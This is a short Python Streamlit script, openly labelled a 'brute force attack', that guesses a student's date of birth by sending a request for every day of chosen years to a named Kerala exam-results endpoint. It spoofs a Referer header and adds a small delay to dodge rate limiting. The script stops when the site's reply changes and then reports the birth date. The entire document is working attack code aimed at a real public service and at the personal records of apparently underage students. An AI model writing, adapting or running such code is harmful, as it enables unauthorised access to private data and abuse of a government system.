import streamlit as st
import requests
from datetime import datetime, timedelta
import time

# Hacker-style intro message with minimal delay
st.header("Initializing brute force attack...")
st.header("Connecting to target server: keralaresults.nic.in")
st.header("Starting date of birth brute force...")

# Replace this with the actual registration number you want to use
regno = st.text_input("Enter register no : ")

# Define the years in the desired priority order
years = st.multiselect("Select years to brute force", [2006, 2005, 2007])

# Create a container for the output
output_container = st.empty()

# Flag to stop the brute force when correct DOB is found
found = False

# Custom header
headers = {
    "Referer": "https://keralaresults.nic.in"
}

# Loop through each year in the specified order
for year in years:
    if found:
        break

    # Define the start and end dates for the current year
    start_date = datetime(year, 1, 1)
    end_date = datetime(year, 12, 31)
    
    # Loop through each day in the current year
    current_date = start_date
    while current_date <= end_date:
        if found:
            break
        
        # Format the date components with leading zeros
        date_str = current_date.strftime("%d")  # day with leading zero
        month_str = current_date.strftime("%m")  # month with leading zero
        year_str = current_date.strftime("%Y")  # year as four digits
        
        # Minimal sleep time to avoid immediate rate limiting
        time.sleep(0.1)  # Sleep for 0.1 second between requests
        
        # Format the URL with the current date
        url = f"https://keralaresults.nic.in/dhse24mra9345/dhses.asp?treg={regno}&dob={date_str}/{month_str}/{year_str}&sid=0.6227467480652762"
        
        try:
            # Send the GET request with custom headers
            response = requests.get(url, headers=headers)
            
            # Check for specific indicators in the response text
            if 'try' in response.text:
                output_message = f"Date: {date_str}/{month_str}/{year_str} - Incorrect DOB, continuing..."
            else:
                output_message = f"Date: {date_str}/{month_str}/{year_str} - Correct DOB found or unexpected response!"
                found = True
                output_container.text(output_message)
                break
            
        except requests.exceptions.RequestException as e:
            output_message = f"Date: {date_str}/{month_str}/{year_str} - Request failed with exception: {e}"
        
        # Update the output container
        output_container.text(output_message)

        # Move to the next day
        current_date += timedelta(days=1)

# Display final output message
if found:
    st.success("Brute force attack successful!")
else:
    st.error("Brute force attack unsuccessful.")
